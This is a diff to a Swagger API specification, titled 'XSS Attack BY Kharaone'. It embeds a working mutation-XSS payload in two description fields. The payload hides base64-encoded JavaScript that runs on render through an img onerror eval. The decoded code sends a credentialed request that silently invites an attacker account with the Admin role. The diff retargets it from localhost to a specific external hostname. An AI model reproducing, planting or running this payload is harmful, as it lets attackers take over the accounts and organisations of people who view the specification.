@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: XSS Attack BY Kharaone
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZnVuY3Rpb24gY3NyZihuYW1lLCBlbWFpbCkgewogICAgY29uc3QgdXJsID0gImh0dHA6Ly9sb2NhbGhvc3Q6MzAwMC9hcGkvb3JnL2ludml0ZXMiOwogICAgY29uc3QgZGF0YSA9IHsKICAgICAgICAibmFtZSI6IG5hbWUsCiAgICAgICAgImxvZ2luT3JFbWFpbCI6IGVtYWlsLAogICAgICAgICJyb2xlIjogIkFkbWluIiwKICAgICAgICAic2VuZEVtYWlsIjogZmFsc2UKICAgIH07CiAgICBjb25zdCBvcHRzID0gewogICAgICAgIG1ldGhvZDogIlBPU1QiLAogICAgICAgIG1vZGU6ICJuby1jb3JzIiwKICAgICAgICBjcmVkZW50aWFsczogImluY2x1ZGUiLAogICAgICAgIGhlYWRlcnM6IHsiQ29udGVudC1UeXBlIjogInRleHQvcGxhaW47IGpzb24ifSwKICAgICAgICBib2R5OiBKU09OLnN0cmluZ2lmeShkYXRhKQogICAgfTsKICAgIGZldGNoKHVybCwgb3B0cyk7Cn0KY3NyZigiYXR0YWNrZXIiLCAiYXR0YWNrZXJAZXhhbXBsZS5jb20iKTs=' onerror='eval(atob(this.id))'>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZnVuY3Rpb24gY3NyZihuYW1lLCBlbWFpbCkgewogICAgY29uc3QgdXJsID0gImh0dHA6Ly9zZW50aW5lbC5kZXZuaXRyby5hd3Mud293aW5jLmNvbS9hcGkvb3JnL2ludml0ZXMiOwogICAgY29uc3QgZGF0YSA9IHsKICAgICAgICAibmFtZSI6IG5hbWUsCiAgICAgICAgImxvZ2luT3JFbWFpbCI6IGVtYWlsLAogICAgICAgICJyb2xlIjogIkFkbWluIiwKICAgICAgICAic2VuZEVtYWlsIjogZmFsc2UKICAgIH07CiAgICBjb25zdCBvcHRzID0gewogICAgICAgIG1ldGhvZDogIlBPU1QiLAogICAgICAgIG1vZGU6ICJuby1jb3JzIiwKICAgICAgICBjcmVkZW50aWFsczogImluY2x1ZGUiLAogICAgICAgIGhlYWRlcnM6IHsiQ29udGVudC1UeXBlIjogInRleHQvcGxhaW47IGpzb24ifSwKICAgICAgICBib2R5OiBKU09OLnN0cmluZ2lmeShkYXRhKQogICAgfTsKICAgIGZldGNoKHVybCwgb3B0cyk7Cn0KY3NyZigiYXR0YWNrZXIiLCAiYXR0YWNrZXJAZXhhbXBsZS5jb20iKTs=' onerror='eval(atob(this.id))'>"></form>
 
   version: production
 basePath: /JSSResource/
@@ -28,7 +28,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZnVuY3Rpb24gY3NyZihuYW1lLCBlbWFpbCkgewogICAgY29uc3QgdXJsID0gImh0dHA6Ly9sb2NhbGhvc3Q6MzAwMC9hcGkvb3JnL2ludml0ZXMiOwogICAgY29uc3QgZGF0YSA9IHsKICAgICAgICAibmFtZSI6IG5hbWUsCiAgICAgICAgImxvZ2luT3JFbWFpbCI6IGVtYWlsLAogICAgICAgICJyb2xlIjogIkFkbWluIiwKICAgICAgICAic2VuZEVtYWlsIjogZmFsc2UKICAgIH07CiAgICBjb25zdCBvcHRzID0gewogICAgICAgIG1ldGhvZDogIlBPU1QiLAogICAgICAgIG1vZGU6ICJuby1jb3JzIiwKICAgICAgICBjcmVkZW50aWFsczogImluY2x1ZGUiLAogICAgICAgIGhlYWRlcnM6IHsiQ29udGVudC1UeXBlIjogInRleHQvcGxhaW47IGpzb24ifSwKICAgICAgICBib2R5OiBKU09OLnN0cmluZ2lmeShkYXRhKQogICAgfTsKICAgIGZldGNoKHVybCwgb3B0cyk7Cn0KY3NyZigiYXR0YWNrZXIiLCAiYXR0YWNrZXJAZXhhbXBsZS5jb20iKTs=' onerror='eval(atob(this.id))'>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZnVuY3Rpb24gY3NyZihuYW1lLCBlbWFpbCkgewogICAgY29uc3QgdXJsID0gImh0dHA6Ly9zZW50aW5lbC5kZXZuaXRyby5hd3Mud293aW5jLmNvbS9hcGkvb3JnL2ludml0ZXMiOwogICAgY29uc3QgZGF0YSA9IHsKICAgICAgICAibmFtZSI6IG5hbWUsCiAgICAgICAgImxvZ2luT3JFbWFpbCI6IGVtYWlsLAogICAgICAgICJyb2xlIjogIkFkbWluIiwKICAgICAgICAic2VuZEVtYWlsIjogZmFsc2UKICAgIH07CiAgICBjb25zdCBvcHRzID0gewogICAgICAgIG1ldGhvZDogIlBPU1QiLAogICAgICAgIG1vZGU6ICJuby1jb3JzIiwKICAgICAgICBjcmVkZW50aWFsczogImluY2x1ZGUiLAogICAgICAgIGhlYWRlcnM6IHsiQ29udGVudC1UeXBlIjogInRleHQvcGxhaW47IGpzb24ifSwKICAgICAgICBib2R5OiBKU09OLnN0cmluZ2lmeShkYXRhKQogICAgfTsKICAgIGZldGNoKHVybCwgb3B0cyk7Cn0KY3NyZigiYXR0YWNrZXIiLCAiYXR0YWNrZXJAZXhhbXBsZS5jb20iKTs=' onerror='eval(atob(this.id))'>"></form>
 
           format: int64
           in: path
